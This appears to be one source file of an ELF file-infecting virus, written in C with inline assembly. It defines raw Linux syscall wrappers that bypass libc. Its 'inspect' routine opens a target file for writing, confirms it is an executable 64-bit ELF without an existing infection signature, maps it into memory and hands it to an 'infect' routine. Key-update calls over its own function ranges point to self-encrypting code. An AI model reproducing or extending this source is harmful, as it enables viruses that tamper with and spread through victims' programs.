#include "war.h"

__INLINE__ static int _open(const char *path, int flags, mode_t mode)
{
	long ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov esi, %1;"
		"mov edx, %2;"
		"mov rax, 2;"
		"syscall;" :: "g"(path), "g"(flags), "g"(mode)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((int)ret);
}

__INLINE__ static int      _fstat(int fd, struct stat *statbuf)
{
	long ret;

	__asm__ __volatile__ (
		"mov edi, %0;"
		"mov rsi, %1;"
		"mov rax, 5;"
		"syscall" :: "g"(fd), "g"(statbuf)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((int)ret);
}

__INLINE__ static int _close(int fd)
{
	long ret;

	__asm__ __volatile__ (
		"mov edi, %0;"
		"mov rax, 3;"
		"syscall" :: "g"(fd)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((int)ret);
}

__INLINE__ static void    *_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset)
{
	void *ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov edx, %2;"
		"mov r10, %3;"
		"mov r8, %4;"
		"mov r9, %5;"
		"mov rax, 9;"
		"syscall" :: "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((void*)ret);
}

__INLINE__ static int     _munmap(void *addr, size_t len)
{
	long ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov rax, 11;"
		"syscall" :: "g"(addr), "g"(len)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return (ret);
}

void	inspect(t_data *data, char *path)
{
//	revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
	update_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
//	printf("inspect key = %lx\n", data->key.two);

	if (data->context != true)
		goto ERR;

	struct stat st;
  	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
		goto ERR;
	if (_fstat(data->bin.fd, &st) < 0)
		goto ERR;
	if (!(st.st_mode & S_IXUSR))
		goto ERR;
	if ((data->bin.map = _mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->bin.fd, 0)) == MAP_FAILED)
		goto ERR;

	data->bin.size = st.st_size;
	data->header = (Elf64_Ehdr*)data->bin.map;
	if ((*((unsigned char*)data->header + EI_MAG0) != ELFMAG0) || \
		(*((unsigned char*)data->header + EI_MAG1) != ELFMAG1) || \
		(*((unsigned char*)data->header + EI_MAG2) != ELFMAG2) || \
		(*((unsigned char*)data->header + EI_MAG3) != ELFMAG3) || \
		(*((unsigned char*)data->header + EI_CLASS) != ELFCLASS64) || \
		(*(uint32_t*)&data->header->e_ident[EI_PAD] == SIGNATURE))
	{
		_munmap(data->bin.map, st.st_size);
		goto ERR;
	}
	data->context = true;

ERR:
//	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	if (data->context == false)
		_close(data->bin.fd);
	infect(data);
}
